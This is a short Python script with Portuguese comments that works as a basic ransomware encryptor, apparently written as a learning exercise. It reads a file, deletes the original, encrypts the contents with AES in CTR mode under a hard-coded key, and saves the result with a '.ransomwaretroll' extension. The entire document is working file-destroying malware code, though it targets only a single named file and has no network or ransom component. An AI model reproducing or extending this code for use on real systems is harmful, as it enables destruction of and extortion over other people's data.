import os
import pyaes

## Passo 1: abrir o arquivo a ser criptografado
file_name = "arquivo.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## Passo2: remover o arquivo
os.remove(file_name)

## chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## Passo3: criptografar o arquivo
crypto_data = aes.encrypt(file_data)

## Passo 4: salvar o arquivo criptografado
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()